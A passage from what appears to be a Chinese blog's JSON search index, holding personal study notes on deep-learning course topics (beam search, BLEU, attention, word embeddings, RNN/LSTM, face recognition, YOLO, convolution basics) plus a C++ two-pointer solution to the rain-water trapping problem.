思路四：双指针\n\n从两个方向进行遍历，left是从左遍历的索引，right是从右遍历的索引，leftmax是left左边的最大值，rightmax是right右边的最大值，如果left左边的最大值比right右边的最大值还大的话，right处是可以储水的，因为就算right和left中间的值比right处的值小，但是在left左边的值比right大，就可以储水，但是left处不一定能储水，因为left处的值可能也比rightmax大，但是我们可以确保rightmax肯定大于等于right处的值，right就往左边移动，同时每一遍都分别比较right处值和left处值和rightmax，leftmax的大小，进行更新\n\n#### 代码四\n\n```c++\nclass Solution {\npublic:\n    int trap(vector<int>& height) {\n        int n = height.size();\n        int left = 0, right = n - 1;\n        int leftMax = height[left], rightMax = height[right];\n        ++left, --right;\n        int ans = 0;\n        while(left <= right) {\n            leftMax = max(leftMax, height[left]);\n            rightMax = max(rightMax, height[right]);\n            if(leftMax < rightMax) {\n                ans += leftMax - height[left];\n                left++;\n            }else {\n                ans += rightMax - height[right];\n                right--;\n            }\n        }\n        return ans;\n    }\n};\n```\n\n","tags":["c","c++"],"categories":["数据结构"]},{"title":"深度学习week5_3","url":"/post/92da2407.html","content":"\n## 基础模型\n\n翻译模型（seq2seq）：\n\n+ 建立一个编码网络，对输入进行编码，也就是进行学习\n+ 建立一个解码网络，当所有的输入完了之后对编码后的变量进行解码得到翻译的结果\n+ <!--more-->\n\n![image-20230716152818762](./week5-3/image-20230716152818762.png)\n\n类似的还有通过一张图片得到输出(img2seq)，比如通过如下图片得到这只猫坐在沙发上的句子：\n\n![image-20230716152954800](./week5-3/image-20230716152954800.png)\n\n## 选择最可能的句子\n\n机器翻译vs语言模型，有很多类似的地方，机器翻译也叫做局限性的语言模型\n\n![image-20230716153252292](./week5-3/image-20230716153252292.png)\n\n但是生成的y的质量要确保最好，使得最好的那项最大化\n\n可能的结果：\n\n![image-20230716153444023](./week5-3/image-20230716153444023.png)\n\n为什么不选择贪心算法，贪心算法是一个一个的选单词出来，先选最有可能的y1，再在这个基础上选最有可能的y2，但是可能就会导致初夏下图第二排的结果，因为going比visiting更常见，但是我们不希望这种：\n\n![image-20230716191250724](./week5-3/image-20230716191250724.png)\n\n## 定向搜索\n\n也叫做集束搜索\n\n集束搜索会考虑多个选择，贪心算法只会选择最有概率的那个 B：集束宽，表示一次考虑B个选择，比如step1，就从所有词表中选出三个最有可能的选择，然后分别对这三个选择再算其所有词表的概率，从30000个里面选出最优的三个选择\t\n\n![image-20230716191901310](./week5-3/image-20230716191901310.png)\n\n## 改进定向搜索\n\n长度归一化（如果不归一化最后得到的概率一定是一个很小的数字，因为有很多个小于1的数字相乘，两种方法，直接log或者再除于这段语句的长度）：\n\n![image-20230716193157256](./week5-3/image-20230716193157256.png)\n\n怎么选择B(束)：\n\n![image-20230716193449880](./week5-3/image-20230716193449880.png)\n\n## 定向搜索的误差分析\n\n出现错误的翻译（比较输出错误的概率和正确的概率）：\n\n![image-20230716193812475](./week5-3/image-20230716193812475.png)\n\n如果算法得到的单词比人类的单词概率更高，说明是RNN模型有问题(尝试正则化或者增加样本)，如果更低，就是束搜索有问题，选择了错误的y（尝试更大的B）\n\n![image-20230716194017928](./week5-3/image-20230716194017928.png)\n\n## Bleu得分\n\n评估模型\n\n给定一个机器生成的翻译，它能够自动的计算一个分数来衡量机器的好坏\n\n衡量的一个指标是精确度，就是机器翻译结果的每一个单词在参考中是否出现，第二个是机器翻译的结果在参考中出现最多的是多少个单词\n\n![image-20230716194626721](./week5-3/image-20230716194626721.png)\n\n比较二元词组（count是出现在输出里的次数，countclip是在参考中的最多的出现次数）：\n\n![image-20230716194917738](./week5-3/image-20230716194917738.png)\n\n多元词组：\n\n![image-20230716195107275](./week5-3/image-20230716195107275.png)\n\nCoursera官网提示: 这里的otherwise应该是exp(1-reference_output_length/MT_output_length)\n\n这里是得分，如果MT翻译短了得分需要降低，所以幂需要变小，减掉的项应该变大，所以应该是reference/MT\n\n![image-20230716195226374](./week5-3/image-20230716195226374.png)\n\n## 注意力模型直观理解\n\n如果机器每次都要先记忆整个句子输入完了之后在翻译，有可能这个句子非常的长，这将导致记忆很困难，最后的输出就像蓝色的线，对于短句子效果好，对于长句子效果不好\n\n![image-20230716200013916](./week5-3/image-20230716200013916.png)\n\n注意力模型实现绿色的线\n\n在正常双向RNN计算出输出之后，再有一层隐藏单元，这里的α<1,1>表示注意力，表示第一个输出的再第一个输入的输出这里的注意值是多少，以此类推\n\n![image-20230716200725180](./week5-3/image-20230716200725180.png)\n\n## 注意力模型\n\n对于一个输出，所有的注意力权重之和为1，如图所示c<1> c<2>是算出来的输入到隐藏层的值\n\n![image-20230716201246436](./week5-3/image-20230716201246436.png)\n\n如图所示a<t,t_hat>是和S<t-1>和a<t_hat>有关的，代表t_hat输入对t输出的注意力值，因为如图右边，s<t>的得出需要a和y<t-1>，同时y<t-1>是由s<t-1>得出来的，所以有这个结果\n\n![image-20230716201654655](./week5-3/image-20230716201654655.png)\n\n## 语音辨识\n\n将音频自动生成文字\n\n音频数据的常见预处理步骤：就是运行这个原始的音频片段，然后生成一个声谱图，横轴是时间，纵轴是频率，图中的颜色代表了声音的能量，还有伪空白输出，也就是在音频被输入到学习算法之前，而人耳所做的计算\n\n过去科学家们认为用一些基本的音位单元来表示音频是做语音识别最好的方式，现在已经不需要了\n\n注意力模型的语音辨识：\n\n![image-20230716202416099](./week5-3/image-20230716202416099.png)\n\n还有种方法：CTC损失函数，语音识别通常输入维度大于输出维度，因为语音识别的话输入是赫兹，可能包含很多个样本，那对于一个输入对应一个输出的结构怎么办呢：用特殊字符代表空白字符，这里用下划线表示空白字符：\n\n![image-20230716202644473](./week5-3/image-20230716202644473.png)\n\n## 触发字检测\n\n所谓触发字检测就是，语音说敏感词汇：比如 嘿siri\n\n在接收到敏感词汇时输出1\n\n![image-20230716202909321](./week5-3/image-20230716202909321.png)\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week5_2","url":"/post/e5dd1491.html","content":"\n## 词汇表征\n\n将RNN GRU LSTM用于自然语言处理（NLP）\n\n词嵌入：让算法自动的理解一些类似的词\n\n我们上周的理解是这样的,(one-hot)将所有词都存在一个词表里面，但是这样就会导致词和词之间是独立的，比如如下图的情况，orange和apple本来是很相近的两个词，比如下面两个句子都应该学习到后面的一个词是果汁，因为苹果和橙子是相近的两个词，但是如果相互独立就很难这么学习到：\n\n<!--more-->\n\n![image-20230716085326082](./week5-2/image-20230716085326082.png)\n\n现在变成特征化表达：![image-20230716090208200](./week5-2/image-20230716090208200.png)\n\n可以将多维的特征降维（t-SNE），有点像k聚类\n\n![image-20230716090359957](./week5-2/image-20230716090359957.png)\n\n## 使用词嵌入\n\n如果遇到一些不常见的词，而自己的训练样本又比较小，可以考虑迁移学习，用网上已经学习好的词嵌入模型\n\n![image-20230716090910001](./week5-2/image-20230716090910001.png)\n\n当训练集越小时，词嵌入效果越好，词嵌入基本流程：\n\n![image-20230716091323600](./week5-2/image-20230716091323600.png)\n\n和卷积网络所学到的比较两张人脸有一定相似性\n\n![image-20230716091741875](./week5-2/image-20230716091741875.png)\n\n## 词嵌入的特性\n\n词嵌入可以帮助实现类比推理\n\n比如我们知道男人对应女人，怎么让机器推导出国王对应王后呢：比较它们的差\n\n![image-20230716092632787](./week5-2/image-20230716092632787.png)\n\n将要求的单词设为e_w,求相似度:\n\n![image-20230716131131937](./week5-2/image-20230716131131937.png)\n\n余弦相似度，感觉相当于一个向量是一个点：\n\n![image-20230716131332253](./week5-2/image-20230716131332253.png)\n\n## 嵌入矩阵\n\n当利用算法学习一个词嵌入的时候相当于是在学习一个嵌入矩阵\n\n相当于总共有300个特征，每个单词都是一个特征，300维，把这个矩阵叫做嵌入矩阵E,每次我们要取某个单词的特征的时候，我们用特征 * one_hot的值，就可以得到一个300维该单词的特征\n\n![image-20230716132747851](./week5-2/image-20230716132747851.png)\n\n## 学习词嵌入\n\n神经网络结构：\n\nE是嵌入矩阵，o是one_hot,算出e是该单词的300维的特征向量，然后输出，参数可以通过梯度函数调整，很好的学习两个特征值相近的词，可以规定只从前面几个词学习\n\n![image-20230716133405684](./week5-2/image-20230716133405684.png)\n\n如果我们想训练出一个语言模型，只选择相邻几个单词学习是一种不错的选择，如果我们想学习其他嵌入算法，可以选择另外的单词学习\n\n![image-20230716133806764](./week5-2/image-20230716133806764.png)\n\n## Word2Vec\n\nskip-grams（感觉像是训练两个邻近的单词的对应关系，上下文某个单词->目标单词）：\n\n![image-20230716134123485](./week5-2/image-20230716134123485.png)\n\n简单模型，输出是一个10000维的向量，和one_hot一样：\n\n![image-20230716134416765](./week5-2/image-20230716134416765.png)\n\n强迫算法去做预测，算法只能根据词嵌入矩阵来预测，然后告诉算法你算错了，算法就自己去修改词嵌入矩阵了\n\n但是直接这样计算softmax，由于维度已经10000了可能更高，算法效率低，可以考虑采用分级softmax分类器（二叉树），使用的树，常用词在顶部，不常用词在深度，方便查找，通常不是平衡的二叉树\n\n![image-20230716134911235](./week5-2/image-20230716134911235.png)\n\n## 负采样\n\n构造新的监督模型\n\n先随机选择一个单词作为context，然后在近10个单词中选择word，设为正样本，然后再从词表中随机找k个单词，将这一组设为负样本，监督学习，最后的输入就行x，预测y，预测他是正样本还是负样本\n\n![image-20230716135912729](./week5-2/image-20230716135912729.png)\n\n之前就需要算10000维的softmax，这里就不需要，将输入应用到10000个神经元，每次只更新k+1个，这里k是4，用得出来的正样本和负样本去进行迭代\n\n![image-20230716140423569](./week5-2/image-20230716140423569.png)\n\n怎么进行负采样（怎么随机选择负采样的word,图下是比较常用的方法):\n\n![image-20230716141711423](./week5-2/image-20230716141711423.png)\n\n## GloVe词向量\n\nXij是一个能够获取单词i和单词j出现位置相近时或者彼此接近的频率的计数器\n\n![image-20230716143026674](./week5-2/image-20230716143026674.png)\n\n本质是用词嵌入矩阵去构造一个网络去预测两个词同时出现的频率，但是我们并不需要这个网络，而仅仅通过网络来训练词嵌入矩阵\n\n每一个可能的目标词有一个参数向量$\\theta_{t}$和另一个参数向量$e_{c}$\n\n![image-20230716150111482](./week5-2/image-20230716150111482.png)\n\n实际上最后通过网络的到这些向量特征不是简单的Gender这些特征\n\n各轴之间可能有关联\n\n![image-20230716150405613](./week5-2/image-20230716150405613.png)\n\n## 情绪分类\n\n最大的挑战是标记的数据集不够多\n\n用所有特征相加求平均值的方法（缺点：没考虑词序）：\n\n![image-20230716150737836](./week5-2/image-20230716150737836.png)\n\n解决方式（用RNN做）：\n\n![image-20230716150930621](./week5-2/image-20230716150930621.png)\n\n## 词嵌入除偏\n\n存在偏见，如下图，下图是一个训练好的语言模型得到的结果\n\n![image-20230716151157772](./week5-2/image-20230716151157772.png)\n\n第一步：判断出我们要减少什么偏见\n\n第二步：对本来不应该有偏见的词，即中立的词出现偏见之后将他们往中和值靠近\n\n第三步：把本身对立的，比如祖母和祖父移到靠近中和值差不多位置的地方\n\n![image-20230716151649161](./week5-2/image-20230716151649161.png)\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week5_1","url":"/post/7cd4452b.html","content":"\n## 为什么选择序列模型\n\n序列模型的适用范围\n\n![image-20230715162320554](./week5-1/image-20230715162320554.png)\n\n<!--more-->\n\n## 数学符号\n\nX(i)< t >表示第i个样本的第t个单词，T(i)表示第i个样本的单词总数\n\ny(i)< t >表示第i个样本的第t个单词的判断结果，1或者0\n\n![image-20230715164647496](./week5-1/image-20230715164647496.png)\n\n![image-20230715165031120](./week5-1/image-20230715165031120.png)\n\n有一个词表存储了所有的单词，x就用one-hot的方式表达，one-hot的意思是，一个列表中只有一个值为1，表示该词在词表的某位置，如果遇到了不在词表中的单词，就用<UNK>表示\n\n## 循环神经网络\n\n两个难点：\n\n+ 一个句子的长度不是固定的\n+ 希望得出来的结果是根据文本内容进行判断的，而不是单词位置，同时x可能是词表的映射，可能是一个维度很大的向量\n\n![image-20230715165420478](./week5-1/image-20230715165420478.png)\n\n循环神经网络（这是表示一个单词一个单词做判断，但是单词之间不是独立的，第一个单词训练时，会用到初始变量a<0>，第二个单词判断时会用到第一个单词训练时产生的参数a<1>,也就是说，第i个单词判断时，会和前i-1个单词都有关，包括初始变量，输入时用到的参数时Wax,激活变量用到的参数是Waa,输出变量用到的参数是Wya,ax表示要乘以x计算出a,aa表示要乘以a计算出a,ya表示要乘以a计算出y）：\n\n![image-20230715165930365](./week5-1/image-20230715165930365.png)\n\n向前传播的过程，向前传播一般用tanh，有时候也用RELU\n\n输出就看是二分类还是多分类\n\n![image-20230715170510059](./week5-1/image-20230715170510059.png)\n\na<t-1>和x<t>是同列数的，将Waa和Wax结合起来，将a<t-1>和x<t>结合起来\n\n![image-20230715170939331](./week5-1/image-20230715170939331.png)\n\n## 通过时间的反向传播\n\n反向传播，用的参数都是一样的，然后算导数，算梯度：\n\n![image-20230715171559045](./week5-1/image-20230715171559045.png)\n\n## 不同类型的循环神经网络\n\n上面所讲的循环神经网络是输入维度等于输出维度（T_x=T_y）\n\n下面介绍不等的情况\n\n比如情感分类：\n\n![image-20230715172301464](./week5-1/image-20230715172301464.png)\n\n比如翻译：\n\n![image-20230715172318331](./week5-1/image-20230715172318331.png)\n\n多对一和长度相等的多对多：\n\n![image-20230715172558615](./week5-1/image-20230715172558615.png)\n\n一对多（第一个输入对应一个输出，再自动生成输出）和长度不等的多对多（先获取所有输入，再进行输出）\n\n![image-20230715172748471](./week5-1/image-20230715172748471.png)\n\n总结：\n\n![image-20230715172933246](./week5-1/image-20230715172933246.png)\n\n## 语言模型和序列生成\n\n识别概率：![image-20230715181025055](./week5-1/image-20230715181025055.png)\n\n可以选择用<EOS>表示一句话结尾，同时如果Mau不在字典里面，就用<UNK>表示，表示不在字典里面\n\n![image-20230715181237526](./week5-1/image-20230715181237526.png)\n\n\n\n输出是softmax输出，告诉我是每个单词的概率是多少，感觉这里是自动生成\n\n![image-20230715181759315](./week5-1/image-20230715181759315.png)\n\n## 新序列采样\n\n在训练了一个模型之后，要知道该模型完成了什么功能，就要进行新序列采样\n\n输出是softmax，包含了输出是某个单词的概率分别是多少，\n\n![image-20230715182145155](./week5-1/image-20230715182145155.png)\n\n建立一个语言模型并去使用它，对训练出来的语言模型进行采样，比如给机器一串新闻，让他以某种人的语气输出来\n\n## 带有神经网络的梯度消失\n\n对于一个很深的神经网络，很难靠影响前面的层来影响后面的层，所以对于一个句子，过于前面的内容很难影响到后面的句子，但是后面的句子可能就是依靠与前面的内容，所以基本的RNN有很多局部影响，但是还是很难做到影响，这是RNN的一个难点，梯度爆炸可以用梯度修剪处理，但是梯度消失很难\n\n## GRU\n\n处理梯度消失：GRU（门控循环单元）\n\n改变了RNN的隐藏层，可以更好的捕捉深层连接，\n\nRNN隐藏层：\n\n![image-20230715185759017](./week5-1/image-20230715185759017.png)\n\nGRU会产生一个c：记忆细胞，提供了记忆的能力\n\n因为当前time step输出的激活值会随着时间推移，由于后层各种输入和计算逐渐对后层失去影响，所以想用一个记忆单元保存当前时刻的激活值，在后层计算时施加影响。也就是说at会被替换成ct\n\n有一个门，他会记录一个记忆细胞，并决定什么时候更新这个记忆细胞\n\n如图所示，ct和at的值实际上是一样的，ct就是记忆细胞，门是用来决定是不是要更新ct，就如下方ct的函数，门的值也是通过ct-1和x的值决定的，用的sigmoid方法，输出只有0-1，用来觉得ct和ct-1的关系，以及该层ct_hat的值，然后算出yt\n\n![如图所示](./week5-1/image-20230715190801359.png)\n\n另一种GRU:门r表示ct-1和ct的相关性，也是为了应对梯度消失的问题:\n\n![image-20230715191209300](./week5-1/image-20230715191209300.png)\n\n## LSTM（长短期记忆）\n\n增加了门f：遗忘门\n\n有三个门，更新门，遗忘门，输出门，门值都在0-1之间\n\n![image-20230715191739066](./week5-1/image-20230715191739066.png)\n\n如果门不止和a x有关，可以自己添加\t如下面那一排所示，c0很容易传递下去\n\n![image-20230715192057173](./week5-1/image-20230715192057173.png)\n\n推荐LSTM\n\n## 双向神经网络\n\n单项示例：可能是RNN块，GRU块，LSTM块：\n\n![image-20230715192351213](./week5-1/image-20230715192351213.png)\n\n输出就和正向传播和逆向传播参数都有关\n\n![image-20230715192703914](./week5-1/image-20230715192703914.png)\n\n需要完整的句子才能进行预测\n\n## 深层循环神经网络\n\n通常我们会把RNN的多个层堆叠起来，构建更深的模型\n\n[]里面是第几层的参数\n\n<>里面是第几个单词或者字符\n\n![image-20230715193833334](./week5-1/image-20230715193833334.png)\n\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week4_4","url":"/post/d7cdb93.html","content":"\n## 什么是人脸识别\n\n识别加验证\n\n## One-Shot学习\n\n一次学习问题：需要通过单单一张照片去识别一个人\n\n因为通常一个人只会录入它的一张照片，这对于神经网络来说样本数太少，除此之外，如果添加了新的人，就得重新训练模型\n\n一种计算方法——计算相似度（这里的阈值时超参数，并且如果样本新增了一张图片也不会有问题，不需要重新训练，一张一张的比较）：\n\n<!--more-->\n\n![image-20230715135532682](./week4-4/image-20230715135532682.png)\n\n## Siamese网络\n\n用两张人脸为输出，相似度为输出\n\n用相同参数的神经网络，得到全连接的输出，正常我们的话是将全连接的输出连上一个softmax得到分类输出，在这里就不进行分类输出，将两张图片的全连接输出进行对比，得到相似度\n\n![image-20230715140328267](./week4-4/image-20230715140328267.png)\n\n## Triplet损失\n\n三元组定义损失函数：\n\nA是数据库中的样本，P是和样本人一样的另一张图片，N和A不是同一个人，损失函数f(A)-f(P)应该是一个比较小的值，f(A)-f(N)应该是一个比较大的值，取(f(A)-f(p))^2-(f(A)-f(N))^2+α，0之间的较大值，加α的原因是希望这两个平方之间有一定差值而不是完全相等\n\n![image-20230715144310124](./week4-4/image-20230715144310124.png)\n\n为了希望训练出的参数对任意的两张图片都可以得以准确判断，因此在训练的时候尽量选相近的两张图片\n\n## 面部验证与二分类\n\n将面部验证演算成一个二分类问题：\n\n![image-20230715145550115](./week4-4/image-20230715145550115.png)\n\n数据库在引进一个新的图片的时候会预先计算出全连接后的编码，这样再进行人脸检测的时候就不需要再等数据库中的样本进行训练，只需要训练进行检测的人脸\n\n## 什么是神经风格转换\n\n比如：结合两张风格不同的图片生成一张结合的图片\n\n## 什么是深度卷积网络\n\n浅层可能只能识别出边界，深层可以看出识别目的是什么\n\n## 代价函数\n\n神经风格转换代价函数（分别计算得出来的图像和内容之间的成本函数，和风格之间的成本函数，然后用超参数结合起来）：\n\n![image-20230715152501656](./week4-4/image-20230715152501656.png)\n\n最开始直接初始化G的像素值，然后不断学习，使G越来越符合条件\n\n![image-20230715154052085](./week4-4/image-20230715154052085.png)\n\n## 内容代价函数\n\n选取l层，计算c和g之间的差值，然后梯度更新\n\n![image-20230715154441108](./week4-4/image-20230715154441108.png)\n\n## 风格代价函数\n\n若两个通道相关系数大，则它们呈线性关系的程度强，因此出现的概率也相似。\n\n所有通道两两组合，两个通道记为k，k^，组合的对应元素相乘再相加，得到G（k,k^）（风格矩阵）\n\n![image-20230715160251790](./week4-4/image-20230715160251790.png)\n\n![image-20230715160742670](./week4-4/image-20230715160742670.png)\n\n## 一维到三维推广\n\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week4_3","url":"/post/93184e30.html","content":"\n## 目标定位\n\n对象位置分类(classification with localization)：在一张图中有一个较大的对象，对他进行识别并确认出位置\n\n对象检测(detection)：在一张图中有多个对象，对这多个位置对象进行检测识别并确认出位置\n\n在输出中添加位置标签，bx by是物体中心点的坐标，宽bw，高bh，整张图片起始坐标为(0,0),终坐标为(1,1)\n\n<!--more-->\n\n![image-20230714112547108](./week4-3/image-20230714112547108.png)\n\n## 特征点检测\n\n用pc表示该图中是否有对象，pc=0表示没有对象，那坐标，对象分类就没有意义了，loss函数只算pc和真实的y的值的误差；如果pc=1表示有对象，就需要算每个参数的误差\n\n![image-20230714113505256](./week4-3/image-20230714113505256.png)\n\nsuch as(如果要识别人脸的话，要确认眼角或者嘴角的具体坐标，先输出这张图是否包含人脸，如果包含再输出眼角或者嘴角的具体坐标，可能有很多，在下图中标记了64个嘴巴的坐标，更好学习，但是训练集需要手工标注，最后就需要了解用二维坐标确认人脸，同时确保所有标签在所有图片中处于同一位置，比如一个坐标是左眼角，那在所有的图片中该坐标都要表示左眼角):\n\n![image-20230714113858158](./week4-3/image-20230714113858158.png)\n\n## 目标检测\n\n基于滑动窗口的目标检测\n\n如图所示，采取不同大小的窗口，在一张图上做遍历，如果这个窗口所在位置检测到了对象，就输出1，窗口越大可能影响性能，窗口越小，成本函数代价大\n\n![image-20230714140236101](./week4-3/image-20230714140236101.png)\n\n## 卷积的滑动窗口实现\n\n全连接层变成卷积层（如图所示，下面那一排全连接层的计算是用一个和输入维度一样的过滤器，过滤器的数量就是所有元素的数量，这里是400个，这样也能得到和全连接层一样维度的结果，但是神经网络更深）：\n\n![image-20230714140830432](./week4-3/image-20230714140830432.png)\n\n事先训练好了14 *14的训练集，然后新的样本是16 * 16的，我们应该用滑动窗口的方式，以14为一个，然后移动，但是这样重复的点会太多，我们发现直接在16上进行训练，最后得到的2 * 2矩阵就是我们用滑动窗口分别得到的结果，移动步长是2是因为，在最大池化那里的步长是2，在最下面那一排是一样的\n\n![image-20230714144410366](./week4-3/image-20230714144410366.png)\n\n我们不用将图片划分成多个样本，直接在一张图片上做预测，最后的结果是一点，当然不止一点，一点以及它后面的所有信道\n\n## Bounding Box预测\n\n上节不能输出精确的边界框，能识别在某一个框中有对象，但是不一定正好包括\n\nYolo算法（比如下图，将输入分成3 * 3的格子，最后的输出也是3 * 3的，然后每个格子的输出包括了其是否有对象，有对象的话对象的中点坐标，长和宽）：\n\n![image-20230714145323910](./week4-3/image-20230714145323910.png)\n\n中点在该格子中才代表该格子有对象，但是长和宽不一定在格子里面，这里是前面所说的一个格子的坐标在(0,0)-(1,1)之间，所有说中点坐标在0-1之间\n\n![image-20230714145730075](./week4-3/image-20230714145730075.png)\n\n## 交并比\n\n用于判断对象检测是否准确（loU代表检测出来的边框和实际的交集和并集的比值，通常这个比值大于等于0.5就认为准确）：\n\n![image-20230714151352052](./week4-3/image-20230714151352052.png)\n\n## 非极大值抑制\n\n当多个格子都认为自己包含了同一辆车子的中点，那就取pc值最大的那个中点\n\n![image-20230714152049129](./week4-3/image-20230714152049129.png)\n\n对象检测，识别出边框之后首先去掉pc值比较低的边框，针对同一个对象，选择最佳边框\n\n对每个类别分别运行非最大值预测\n\n## Anchor Boxes\n\n目前对象检测的局限有每个格子只能检测出一个对象\n\n如图所示，y里面包含了两个pc，分别表示有车还是有人，或者是又有车又有人，如果想要有更多的对象，y的维度更高\n\n![image-20230714154407218](./week4-3/image-20230714154407218.png)\n\n## Yolo算法\n\n![image-20230714155148045](./week4-3/image-20230714155148045.png)\n\n## 候选区域\n\nR-CNN：带区域的卷积网络\n\n将图像分成色块，因为如果整个图像都进行检测，很多窗口没有对象就会浪费性能，通过颜色分块，预测哪些块可能有对象\n\n![image-20230714163521661](./week4-3/image-20230714163521661.png)\n\n​    第二步：找到最大值的锚框的索引以及对应的最大值的锚框的分数    \n\n```python\n参数：\n        box_confidence  - tensor类型，维度为（19,19,5,1）,包含19x19单元格中每个单元格预测的5个锚框中的所有的锚框的pc （一些对象的置信概率）。\n        boxes - tensor类型，维度为(19,19,5,4)，包含了所有的锚框的（px,py,ph,pw ）。\n        box_class_probs - tensor类型，维度为(19,19,5,80)，包含了所有单元格中所有锚框的所有对象( c1,c2,c3，···，c80 )检测的概率。\n        threshold - 实数，阈值，如果分类预测的概率高于它，那么这个分类预测的概率就会被保留。\n    \n    返回：\n        scores - tensor 类型，维度为(None,)，包含了保留了的锚框的分类概率。\n        boxes - tensor 类型，维度为(None,4)，包含了保留了的锚框的(b_x, b_y, b_h, b_w)\n        classess - tensor 类型，维度为(None,)，包含了保留了的锚框的索引\nbox_classes = K.argmax(box_scores, axis=-1)    \nbox_class_scores = K.max(box_scores, axis=-1)\n```\n\nbox_classes是返回最大值的索引值，是(19,19,5,1),保留的是box_scores中每一个信道，在本题中就是80个里面最大值的索引值\n\nbox_class_scores是返回80个中的最大值\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week4_2","url":"/post/e41f7ea6.html","content":"\n## 经典网络\n\n![image-20230713105139679](./week4-2/image-20230713105139679.png)\n\n<!--more-->\n\n![image-20230713105457037](./week4-2/image-20230713105457037.png)\n\n![image-20230713110033606](./week4-2/image-20230713110033606.png)\n\n## 残差网络\n\nResnet\n\n非常深的网络是非常难以训练的，因为存在梯度消失和梯度爆炸\n\n远跳连接：可从某一层网络层获取激活，然后迅速地反馈给另一层\n\na[i]插在另一层线性激活之后，relu之前的位置：\n\n![image-20230713114012656](./week4-2/image-20230713114012656.png)\n\n普通神经网络理想状态：左边的绿线\t实际状态：左边的蓝线\t\n\n添加了残差网络的神经网络：右边\n\n![image-20230713114332900](./week4-2/image-20230713114332900.png)\n\n## 残差网络为什么有用\n\n残差学习恒等函数很有用，性能好\t\n\n![image-20230713115200541](./week4-2/image-20230713115200541.png)\n\n## 网络中的网络以及1 * 1卷积\n\n上面的相当于二维的每个元素乘以2\n\n下面的相当于是将高确定，宽确定，一整个信道通过乘以适当权重组成一个新的值，最终形成一个二维平面，和1全连接概念有类似部分\n\n![image-20230713115622891](./week4-2/image-20230713115622891.png)\n\n在想要减少信道数量的时候很有用：\n\n![image-20230713115854519](./week4-2/image-20230713115854519.png)\n\n## 谷歌inception网络简介\n\n基本思想是inception网络不需要认为决定使用哪个过滤器，或是否需要池化，而是由网络自行确定这些参数\n\n可以给网络添加这些参数的所有可能的值，由网络自己去学习，比如下图，在一层中使用了多种卷积，有1 * 1过滤器，3 * 3过滤器，但是由于padding为same，代表输出和输入维度是一样的，对输入进行填充，最后将所有过滤器的内容排起来，作为下一层的输入\n\n![image-20230713150632543](./week4-2/image-20230713150632543.png)\n\n但是直接将一个维度很大的变量压缩成一个维度很小的变量，这样的计算成本很大，因为每个点都需要计算很多次，可以先用1 * 1卷积训练乘以一个维度较小的变量，再将其扩大，这个维度较小的变量叫做瓶颈，合理利用瓶颈可以提高计算效率\n\n## inception网络\n\n如图所示，和上节讲的一致，一层不止用一种卷积，同时对于大维度的变量，先压缩成瓶颈再扩大，\n\n![image-20230713171112496](./week4-2/image-20230713171112496.png)\n\ngoogle的inception网络\n\n\n\n![image-20230713171614807](./week4-2/image-20230713171614807.png)\n\n## 使用开源的实现方案\n\n## 编程\n\n恒等块（维度一致）：![image-20230713185011241](./week4-2/image-20230713185011241.png)\n\n卷积块（维度不一致，需要用卷积调整维度）：\n\n![image-20230713185100305](./week4-2/image-20230713185100305.png)\n","tags":["python"],"categories":["深度学习"]},{"title":"深度学习week4_1","url":"/post/7d162f1c.html","content":"\n## 计算机视觉\n\n计算机视觉可以做到的事情(分类、识别、转换)：\n\n![image-20230711214114438](./week4-1/image-20230711214114438.png)\n\n<!--more-->\n\n对于图片来说，越清晰的图片像素点越多，样本维度也就越大，对于过大的可以用卷积\n\n## 边缘检测示例\n\n*在这儿代表着卷积运算，中间那个3 * 3的方块相当于（垂直边缘检测器）过滤器：\n\n![image-20230711214724539](./week4-1/image-20230711214724539.png)\n\n![image-20230711214746368](./week4-1/image-20230711214746368.png)\n\n为什么可以这么做卷积(可以很好的识别出图像的垂直边缘，比如最左边的图中间是垂直边缘，然后通过卷积，可以识别出中间是边缘，中间就做了高像素处理)：\n\n![image-20230711215116492](./week4-1/image-20230711215116492.png)\n\n## 更多边缘检测内容\n\n区分正边和负边\n\n按照上面的类似情况还有如下（这种就需要转换为绝对值）：\n\n![image-20230711230502838](./week4-1/image-20230711230502838.png)\n\n类似的还有水平边缘检测器：\n\n1   1   1 \n\n0   0   0\n\n-1 -1 -1\n\n事实上存在着很多的水平或者垂直过滤器，事实上，我们不一定要照抄别人有的过滤器，我们可以通过自定义参数设置过滤器，然后通过反向传播不断更新迭代，重点就是**怎么用反向传播进行更新迭代**\n\n![image-20230711231148663](./week4-1/image-20230711231148663.png)\n\n## Padding\n\n卷积的两个缺点：6 * 6的像素会变成4 * 4，元素会减少，这并不是一件好事；并且中间元素会被重复计算很多次，耳边元素只会被计算一次\n\n方法：扩大输入图像像素点，比如下图中的p，p=1就是往外扩大一层，p=2就是往外扩大两层\n\n![image-20230711232503821](./week4-1/image-20230711232503821.png)\n\nvalid的是无padding,没有扩充，same是让输入和输出大小一致\n\n![image-20230711232927694](./week4-1/image-20230711232927694.png)\n\n## 卷积步长\n\n步长：过滤器每次和相符的矩阵进行计算，该矩阵移动方式为两步，计算出输出函数公式向下取整\n\n![image-20230712004337356](./week4-1/image-20230712004337356.png)\n\n![image-20230712083616130](./week4-1/image-20230712083616130.png)\n\n很多卷积定义是这样的：\n\n![image-20230712083518181](./week4-1/image-20230712083518181.png)\n\n## 三维卷积\n\n上一节是针对二维图像的卷积\n\n针对三位卷积：将过滤器也定义成三维的(上面那一层是只对红色做垂直边缘检测，下面那一层是对所有颜色做边缘检测，输入图像的channel和过滤器的channel要一致，最后输出是一维的，用方块来做计算)：\n![image-20230712084320299](./week4-1/image-20230712084320299.png)\n\n如果又要做垂直边缘检测又要做水平边缘检测，就做两层然后将他们结合起来\n\n![image-20230712084644273](./week4-1/image-20230712084644273.png)\n\n## 单层卷积网络：\n\n用多少过滤器输出就有多少维度，下图展示了a[0]到a[1]的过程\n\n![image-20230712084955696](./week4-1/image-20230712084955696.png)\n\n单层卷积网络（输出维度和过滤器数量一致，权重是过滤器乘以它的数量，权重的高宽是一致的，权重的channel和输入的channel是一致的）：\n\n![image-20230712085714334](./week4-1/image-20230712085714334.png)\n\n## 简单卷积网络示例\n\n趋势：高和宽不断变小，维度增大，最后将7 * 7 * 